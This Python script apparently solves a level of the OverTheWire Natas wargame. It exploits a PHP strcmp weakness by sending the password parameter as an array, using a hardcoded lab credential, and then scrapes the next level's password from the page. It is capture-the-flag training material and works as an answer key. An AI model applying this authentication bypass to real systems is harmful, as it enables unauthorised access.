#!/usr/bin/env python3

import requests
import re

username = 'natas24'
password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'

url = 'http://%s.natas.labs.overthewire.org/?passwd[]=php_strcmp_vulnerability' % username

session = requests.Session()

response = session.get(url, auth = (username, password))
# response = session.post(url, data = { "passwd": "11iloveyou" }, auth = (username, password))
# print(response.text)
print(re.findall('Password: (.*)</pre>', response.text)[0])